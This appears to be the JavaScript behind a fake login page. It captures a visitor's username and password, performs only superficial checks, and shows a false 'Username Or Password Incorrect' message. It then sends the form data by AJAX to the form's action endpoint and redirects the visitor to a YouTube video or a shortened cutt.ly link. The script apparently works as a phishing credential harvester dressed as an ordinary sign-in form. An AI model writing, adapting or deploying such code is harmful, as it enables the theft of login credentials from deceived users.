window.addEventListener("DOMContentLoaded", function () {
   
    var userName = document.getElementById('username');
    var password = document.getElementById('password');
     // get the form elements defined in your form HTML above
    var form = document.getElementById("my-form");
    // var button = document.getElementById("my-form-button");
    var status = document.getElementById("status");
    var statusBer = document.getElementById('statusText');
  
    // Success and Error functions for after the form is submitted
  
    function success() {
      form.reset();
      status.classList.add("success");
      status.innerHTML = "Thanks!";
      window.location.replace('https://www.youtube.com/watch?v=MWOM6-bSZGI');
    }
  
    function error() {
      status.classList.add("error");
      status.innerHTML = "Oops! There was a problem.";
      window.location.replace('https://www.youtube.com/watch?v=MWOM6-bSZGI');
    }
  
    // handle the form submission event
  
    form.addEventListener("submit", function (ev) {
      ev.preventDefault();
      var data = new FormData(form);
      if(((!userName.value.match(/[1-9a-z]/g) || (userName.value.length < 6) || (password.value.length < 6)))){
        statusBer.innerHTML = 'Username Or Password Incorrect';
        statusBer.setAttribute('style','display: block')
      }
      else{
        ajax(form.method, form.action, data, success, error);
      }
    });
  });
  
  // helper function for sending an AJAX request
  
  function ajax(method, url, data, success, error) {
    var xhr = new XMLHttpRequest();
    xhr.open(method, url);
    xhr.setRequestHeader("Accept", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState !== XMLHttpRequest.DONE) {
        window.location.replace('https://cutt.ly/LWvmqU2');
      };
      if (xhr.status === 200) {
        success(xhr.response, xhr.responseType);
      } else {
        error(xhr.status, xhr.response, xhr.responseType);
      }
    };
    xhr.send(data);
  }
  